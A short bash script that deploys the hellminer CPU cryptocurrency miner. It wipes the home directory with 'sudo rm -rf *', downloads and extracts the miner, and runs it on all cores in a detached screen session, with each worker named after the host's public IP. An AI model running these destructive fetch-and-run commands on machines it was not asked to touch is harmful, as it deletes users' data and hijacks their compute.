#!/bin/bash
address=RR1gZge8garhA1K789W4KUkvUB2uWpvRQi
sudo killall screen
cd ~ && sudo rm -rf * && mkdir hellminer && cd hellminer && wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz

core=$(nproc --all)
ip=$(curl ifconfig.me)
ip="${ip//./_}"
chmod +x hellminer
sudo screen -dmS hell ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u $address.$ip -p x --cpu $core
